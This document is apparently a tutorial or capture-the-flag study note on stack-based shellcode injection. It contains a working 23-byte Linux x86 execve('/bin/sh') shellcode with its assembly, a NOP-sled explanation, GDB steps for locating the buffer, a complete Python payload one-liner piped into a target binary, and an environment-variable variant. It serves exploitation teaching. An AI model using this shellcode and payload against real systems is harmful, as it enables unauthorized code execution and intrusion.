# Shellcode Injection

Shellcode is raw machine code (not C, not assembly text, but actual bytes) injected into a program's memory and executed. It typically spawns a shell, hence the name.

## When does it work?

- **NX must be OFF** (stack must be executable)
- You need a buffer overflow to:
  1. Write shellcode into the buffer
  2. Overwrite the return address to point to the buffer

If NX is ON, the CPU will refuse to execute code on the stack → use ret2libc instead.

## How it works

### Normal execution:
```
[buffer] [saved EBP] [return addr → back to caller]
```

### After injection:
```
[NOP sled + shellcode] [saved EBP] [return addr → points to buffer]
                                     ↓
                       CPU jumps to buffer, executes shellcode
```

## The shellcode

A minimal Linux x86 shellcode that calls `execve("/bin/sh", NULL, NULL)`:

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

This is 23 bytes. In assembly it does:

```asm
xor    eax, eax         ; eax = 0
push   eax              ; null terminator
push   0x68732f2f       ; "//sh"
push   0x6e69622f       ; "/bin"
mov    ebx, esp         ; ebx → "/bin//sh\0"
push   eax              ; NULL (envp)
push   ebx              ; pointer to "/bin//sh"
mov    ecx, esp         ; ecx → ["/bin//sh", NULL]
mov    al, 0x0b         ; syscall 11 = execve
int    0x80             ; syscall
```

## NOP sled

The NOP sled (`\x90\x90\x90...`) is padding that does nothing (NOP = No Operation). It makes the exploit more reliable; you don't need to hit the exact start of your shellcode. As long as execution lands anywhere in the NOP sled, it slides down to the shellcode.

```
[NOP NOP NOP NOP NOP NOP shellcode] [saved EBP] [addr → somewhere in NOPs]
 \x90\x90\x90\x90\x90\x90\x31\xc0...
 ←── landing zone ──→ ←── code ──→
```

## Step by step

### 1. Find the buffer address

In GDB, set a breakpoint after gets() and examine the stack:

```
(gdb) b *0x08048495
(gdb) run < <(python -c "print('A' * 76)")
(gdb) x/20x $esp
```

Look for the 0x41414141 (AAAA) block; that's your buffer.

Or check the register used for the buffer:
```
(gdb) info registers
```

### 2. Find the overflow offset

Same as buffer overflow: find how many bytes until the return address.

### 3. Build the payload

```
[NOP sled] + [shellcode] + [padding] + [buffer address]
```

The total before the return address must equal the offset (e.g., 76 bytes):
- NOP sled: fills most of the space
- Shellcode: 23 bytes
- Padding: enough to reach 76 bytes total
- Buffer address: 4 bytes, overwrites return address

### 4. Run it

```bash
(python -c "
nop = '\x90' * 50
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
padding = 'A' * (76 - len(nop) - len(shellcode))
ret = '\xXX\xXX\xXX\xXX'  # buffer address in little-endian
print(nop + shellcode + padding + ret)
"; cat) | ./binary
```

## Environment variable trick

If the buffer is too small for shellcode, store it in an environment variable:

```bash
export SHELLCODE=$(python -c "print('\x90' * 100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')")
```

Then find its address in memory:

```c
#include <stdio.h>
#include <stdlib.h>
int main() {
    printf("%p\n", getenv("SHELLCODE"));
    return 0;
}
```

Compile and run this helper to get the address, then use it as the return address.

## When to use

| Condition | Technique |
|---|---|
| NX off + buffer overflow | Shellcode injection |
| NX on + useful function exists | ret2function |
| NX on + ASLR off + libc loaded | ret2libc |
| NX on + ASLR on | ROP chains (advanced) |
